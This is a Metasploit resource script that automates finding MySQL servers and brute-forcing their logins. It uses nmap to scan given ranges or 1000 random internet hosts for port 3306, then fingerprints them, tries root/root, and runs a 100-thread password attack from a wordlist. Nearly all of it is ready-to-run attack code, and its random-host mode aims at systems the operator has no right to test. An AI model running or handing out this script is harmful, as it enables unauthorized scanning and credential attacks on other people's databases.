   <ruby>
      help = %Q|
        Description:
          setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with port 3306 open
          setg RHOSTS 192.168.1.71 192.168.1.254 - To instruct db_nmap to check targets for port 3306 open
          setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
          mysql_brute will use nmap to search/check for port 3306 open, then it populates the msfdb with
          a list of hosts found, and run auxiliary modules to gather info and brute force mysql services.
          if none value (setg) has povided then this resource script will use is own default values.

        Execute in msfconsole:
          setg RANDOM_HOSTS <true-or-blank>
          setg RHOSTS <hosts-separated-by-spaces>
          setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
          resource <path-to-script>/mysql_brute.rc

        Author:
          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
      |
      print_line(help)
      Rex::sleep(2.0)

      if (framework.datastore['RANDOM_HOSTS'] == 'true')
         print_line("RHOSTS => nmap -sV -Pn -T4 -O -iR 1000 -p 3306 --script=mysql-info.nse --open")
      elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
         run_single("setg RHOSTS 192.168.1.0/24")
      elsif (framework.datastore['RHOSTS'])
         print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
      end
      if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
         run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
      end
      unless (framework.datastore['RANDOM_HOSTS'] == 'true')
         run_single("db_nmap -sV -Pn -T4 -O -p 3306 --script=mysql-info.nse --open #{framework.datastore['RHOSTS']}")
      else
         print_warning("db_nmap: search for random remote targets with port 3306 open (mysql)")
         run_single("db_nmap -sV -Pn -T4 -O -iR 1000 --script=mysql-info.nse -p 3306 --open")
      end

      run_single("spool /root/mysql_brute.log")
      run_single("services")
      print_good("Reading msfdb database for info.")
      xhost = framework.db.hosts.map(&:address).join(' ')
      xport = framework.db.services.map(&:port).join(' ')
      xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')

         if xhost.nil? or xhost == ''
              print_error("db_nmap scan did not find any alive connections.")
              print_error("Please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg RHOSTS USERPASS_FILE RANDOM_HOSTS")
              return nil
         elsif xport.nil? or xport == ''
              print_error("db_nmap did not find any 3306 open ports.")
              print_error("Please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg RHOSTS USERPASS_FILE RANDOM_HOSTS")
              run_single("services -d")
              run_single("hosts -d")
              return nil
         end

         print_status("Operative systems: #{xname}")
         run_single("setg RHOSTS #{xhost}")
         Rex::sleep(2.0)
         if xport =~ /3306/i
              print_warning("Remote Target port 3306 mysql found.")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/mysql/mysql_version")
              run_single("set THREADS 20")
              run_single("exploit")
              Rex::sleep(1.5)
              run_single("use auxiliary/admin/mysql/mysql_enum")
              run_single("set USERNAME root")
              run_single("set PASSWORD root")
              run_single("set THREADS 20")
              run_single("exploit")
              Rex::sleep(1.5)
              run_single("use auxiliary/scanner/mysql/mysql_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BLANK_PASSWORDS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 100")
              run_single("exploit")
              Rex::sleep(1.5)
       end

       print_warning("Please wait, Cleaning msfdb Database.")
       Rex::sleep(1.0)
       run_single("unsetg RHOSTS RANDOM_HOSTS USERPASS_FILE")
       run_single("unset THREADS VERBOSE USERNAME USERPASS_FILE PASSWORD STOP_ON_SUCCESS")
       run_single("services -d")
       run_single("hosts -d")
       print_warning("Logfile stored under: /root/mysql_brute.log")
</ruby>
